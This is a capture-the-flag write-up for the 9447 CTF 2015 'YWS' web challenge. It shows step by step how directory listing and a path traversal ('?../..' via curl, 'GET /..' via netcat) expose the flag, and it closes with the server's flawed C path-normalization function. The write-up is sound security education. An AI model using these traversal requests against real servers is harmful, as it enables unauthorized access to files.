Title: CTF writeup - 9447 CTF 2015: YWS
Category: Infosec
Tags: ctf, directory traversal
Summary: Directory traversal and directory listing


## Challenge

> My friend wrote a cool web server. I'm sure he's stored some great doxxxs on the website. Can you take a look and report back any interesting things you find?
>
> The web page is at http://yws-fsiqc922.9447.plumbing
>
> Hint! Where does the website not want you to go?

## Writeup

The first thing to try is robots.txt.

```console
$ curl http://yws-fsiqc922.9447.plumbing/robots.txt
User-agnet: *
Disallow: /
Disallow: /..
Disallow: .
Disallow: ..
Disallow: /work
Disallow: /imegas/
Allow: /sounds/pljesus.wav
```

Seems the author had dyslexia, but navigating to the `/images` folder leads to a [directory listing](https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_Directory_Indexing).

```html
$ curl http://yws-fsiqc922.9447.plumbing/images
<html>
<head>
<title>Directory listing for /images</title>
</head>
<body>
<h2>Directory listing for /images</h2>
<hr>
<ul>
<li><a href="/images/.">.</a>
<li><a href="/images/aangel2.gif">aangel2.gif</a>
<li><a href="/images/dj2.gif">dj2.gif</a>
<li><a href="/images/..">..</a>
<li><a href="/images/rand_tile1.jpg">rand_tile1.jpg</a>
<li><a href="/images/djangopowered126x54.gif">djangopowered126x54.gif</a>
<li><a href="/images/php.jpg">php.jpg</a>
<li><a href="/images/dj1.gif">dj1.gif</a>
<li><a href="/images/secret_images">secret_images</a>
<li><a href="/images/jboogie.gif">jboogie.gif</a>
<li><a href="/images/dj3.gif">dj3.gif</a>
<li><a href="/images/aangel1.gif">aangel1.gif</a>
<li><a href="/images/remail.gif">remail.gif</a>
</ul>
<hr>
</body>
</html>
```

You can also list the web app's root by adding 2 slashes.

```html
$ curl http://yws-fsiqc922.9447.plumbing//
<html>
<head>
<title>Directory listing for /</title>
</head>
<body>
<h2>Directory listing for /</h2>
<hr>
<ul>
<li><a href="//.">.</a>
<li><a href="//images">images</a>
<li><a href="//sounds">sounds</a>
<li><a href="//400.html">400.html</a>
<li><a href="//..">..</a>
<li><a href="//robots.txt">robots.txt</a>
<li><a href="//index.html">index.html</a>
</ul>
<hr>
</body>
</html>
```

Following the hint, we have to do a [directory traversal attack](https://www.owasp.org/index.php/Path_Traversal) and, since directory listing is enabled on the server, we can simply do it on paths instead of specific files.
Trying to list `/..` with curl didn't work and simply showed the website's main page.

```console
$ curl 'http://yws-fsiqc922.9447.plumbing/..'
```

Adding multiple `../` didn't work either.

It finally worked by adding the directory traversal as a query param.

```html
$ curl 'http://yws-fsiqc922.9447.plumbing/?../..'
<html>
<head>
<title>Directory listing for /..</title>
</head>
<body>
<h2>Directory listing for /..</h2>
<hr>
<ul>
<li><a href="/../9447{D1rect0ries_ARe_h4rd}">9447{D1rect0ries_ARe_h4rd}</a>
<li><a href="/../.">.</a>
<li><a href="/../..">..</a>
<li><a href="/../gws">gws</a>
<li><a href="/../files">files</a>
</ul>
<hr>
</body>
</html>
```

Flag: `9447{D1rect0ries_ARe_h4rd}`

## curl gotcha

After the CTF, I followed discussions on IRC and learned that curl will "fix" the path for you before sending the query.

```console hl_lines="1 6"
$ curl -v http://127.0.0.1:8080/../../..
* Rebuilt URL to: http://127.0.0.1:8080/
* Hostname was NOT found in DNS cache
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> User-Agent: curl/7.38.0
> Host: 127.0.0.1:8080
> Accept: */*
```

Most people seem to have used BurpSuite or a plain connection with netcat to get the flag:

```bash
printf "GET /.. HTTP/1.1\r\n\r\n" | nc yws-fsiqc922.9447.plumbing 80
```

## Why adding it as a query param worked

I didn't understand why adding the directory traversal after a `?` worked, since the vulnerability was in the path, not a query param.

I looked at the source code that the organizers uploaded after the CTF, and it turns out that the `extractUrl` function will strip extra levels of `../`.
It only keeps the last one, so it strips the `?` at the same time: `?../..` becomes `/..`.
Here is the function from the source code:

```c
int extractURL(char *urlS, int urlSize, char *fileN, int fileNMaxSize) {
    // Verify it starts with '/'.
    if (urlSize < 1 || urlS[0] != '/') return -1;
    int curS = 1;
    fileN[0] = '/';
    fileN[1] = 0;
    int i;
    for (i = 1; i < urlSize; i++) {
        if (curS == fileNMaxSize) {
            return -1;
        }
        fileN[curS++] = urlS[i];
        fileN[curS] = 0;
        if (strcmp(&fileN[curS - 3], "../") == 0) {
            curS -= 4;
            while (fileN[--curS] != '/');
            curS++;
        }
        if (strcmp(&fileN[curS - 2], "./") == 0) {
            curS -= 2;
        }
    }
    if (strcmp(fileN, "/") == 0) {
        strcpy(fileN, "/index.html");
    } else if (fileN[curS - 1] == '/') {
        fileN[curS - 1] = 0;
    }
    return 0;
}
```
